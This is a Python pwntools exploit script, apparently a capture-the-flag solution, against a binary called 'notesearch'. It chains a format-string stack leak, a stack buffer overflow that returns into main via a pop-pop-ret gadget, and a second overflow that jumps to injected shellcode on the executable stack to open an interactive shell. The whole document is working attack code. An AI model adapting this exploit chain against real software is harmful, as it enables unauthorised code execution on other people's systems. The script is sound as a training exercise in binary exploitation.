from pwn import *
import struct

#p = remote('bin.bcactf.com', 49155)
p = process('./notesearch')

e = ELF('./notesearch')

# read to the prompt
p.readuntil(': ')

'''
searchstring    {Frame offset -0x78}
fd              {Frame offset -0x14}
userid          {Frame offset -0x10}
printing        {Frame offset -0x0c}
saved_rbp       {Frame offset -0x08}
return_address  {Frame offset  0x00}
'''

'''
No leak for this one but it loads at a static address

The stack is executable. So the order is: 
Leak a stack address and overflow the return address from main with the address of main.
This allows us to do the exploit again except the next time the overwrite returns to code on the stack
and we can get a shell.
'''
# 0x0000000000401635 : pop rbx ; pop rbp ; ret
ppr = p64(0x401635)

searchstring = b'%p\x00'

searchstring += b'a'*(0x78 - len(searchstring))
searchstring += ppr
searchstring += p64(0xcafebabe)     ## I need to align the stack
searchstring += p64(0xdeadbeef)
searchstring += p64(e.symbols['main'])
searchstring += b'\n'

input('...')
p.send(searchstring)
leak = int(p.readline().split(b'"')[1], 16)

print('[INFO] Stack leak: 0x%x' %(leak))

## Read to the prompt again
p.readuntil(': ')
input('...')

## get the shellcode
f = open('shellcode', 'rb')
sc = f.read()
f.close()

searchstring = sc
searchstring += b'\xcc'*(0x78 - len(searchstring))

## THe leak + 0x20 is the start of the 0xcc buffer
searchstring += p64(leak + 0x20)
searchstring += b'\n'

p.send(searchstring)

p.interactive()
